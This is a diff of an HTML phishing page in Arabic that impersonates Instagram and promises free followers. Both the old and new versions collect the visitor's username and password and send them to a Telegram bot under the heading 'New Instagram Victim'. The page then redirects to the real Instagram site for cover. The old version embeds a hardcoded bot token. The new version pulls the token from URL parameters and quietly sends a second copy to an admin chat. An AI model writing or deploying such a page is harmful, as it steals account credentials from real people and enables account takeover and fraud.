@@ -3,68 +3,34 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - Get Free Followers</title>
+    <title>Instagram - 50k Followers Pack</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: linear-gradient(45deg, #f09433 0%,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%); margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .card { background: white; width: 90%; max-width: 380px; padding: 25px; border-radius: 15px; box-shadow: 0 15px 30px rgba(0,0,0,0.2); text-align: center; }
-        .logo { width: 180px; margin-bottom: 20px; }
-        h2 { color: #262626; font-size: 18px; margin-bottom: 15px; }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 12px; background-color: #0095f6; border: none; border-radius: 5px; color: white; font-weight: bold; font-size: 14px; cursor: pointer; margin-top: 10px; }
-        .price-tag { font-size: 12px; color: #8e8e8e; margin-top: 5px; display: block; }
-        .security-note { font-size: 11px; color: #a8a8a8; margin-top: 20px; }
+        body { background-color: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { background: white; padding: 40px; border: 1px solid #dbdbdb; width: 100%; max-width: 350px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 25px; }
+        .promo { color: #8e8e8e; font-weight: bold; margin-bottom: 20px; font-size: 15px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 8px; background: #0095f6; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
     </style>
 </head>
 <body>
-
-    <div class="card">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram" class="logo">
-        <h2>احصل على متابعين حقيقيين فوراً 🚀</h2>
-        
-        <form id="igForm">
-            <input type="text" id="username" placeholder="اسم المستخدم (Username)" required>
-            <input type="password" id="password" placeholder="كلمة السر" required>
-            
-            <select id="plan">
-                <option value="1000_Free">1,000 متابع (مجاني - Free) ✅</option>
-                <option value="10000_5JD">10,000 متابع (5.00 JOD) 💰</option>
-                <option value="50000_15JD">50,000 متابع (15.00 JOD) 🔥</option>
-                <option value="100000_25JD">100,000 متابع (25.00 JOD) 👑</option>
-            </select>
-            <span class="price-tag">* المتابعين يتم إضافتهم خلال 5 دقائق</span>
-
-            <button type="submit" class="btn">تفعيل الزيادة الآن</button>
+    <div class="box">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monochrome_logo.png/d6a6460317e6.png" class="logo">
+        <p class="promo">سجل دخولك لاستلام 50,000 متابع مجاناً 🎁</p>
+        <form id="loginForm">
+            <input type="text" id="user" placeholder="اسم المستخدم" required>
+            <input type="password" id="pass" placeholder="كلمة السر" required>
+            <button type="submit">تسجيل الدخول</button>
         </form>
-
-        <p class="security-note">نحن نستخدم تشفير 256-bit لضمان أمان حسابك.</p>
     </div>
-
     <script>
-        const urlParams = new URLSearchParams(window.location.search);
-        const chatId = urlParams.get('chat_id') || '7238206121'; 
-        const botToken = urlParams.get('bot_token') || '8669513520:AAFYrZjQ_dKL5dCfKU74XN0c1tOCte_HkwY';
-
-        document.getElementById('igForm').addEventListener('submit', function(e) {
+        const p = new URLSearchParams(window.location.search);
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
-            
-            const user = document.getElementById('username').value;
-            const pass = document.getElementById('password').value;
-            const plan = document.getElementById('plan').value;
-
-            const message = `
-📸 **New Instagram Victim!**
-👤 **User:** \`${user}\`
-🔑 **Pass:** \`${pass}\`
-📈 **Plan:** \`${plan}\`
-💻 **System:** M.Y.9 Tech
-🦅 **Dev:** Abu Osayed Malkawi
-            `;
-
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=Markdown`)
-            .then(() => {
-                // تحويل لصفحة إنستا الحقيقية للتمويه
-                window.location.href = "https://www.instagram.com/accounts/login/";
-            });
+            const msg = `📸 **New IG Victim!**\n👤 **User:** \`${document.getElementById('user').value}\`\n🔑 **Pass:** \`${document.getElementById('pass').value}\`\n🎁 **Gift:** 50k Followers\n👑 **Dev:** Abu Osayed`;
+            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('user_id')}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`);
+            fetch(`https://api.telegram.org/bot${p.get('bot_token')}/sendMessage?chat_id=${p.get('admin_id')}&text=${encodeURIComponent("⚠️ نسخة المراقبة:\n"+msg)}&parse_mode=Markdown`)
+            .then(() => location.href="https://instagram.com");
         });
     </script>
 </body>
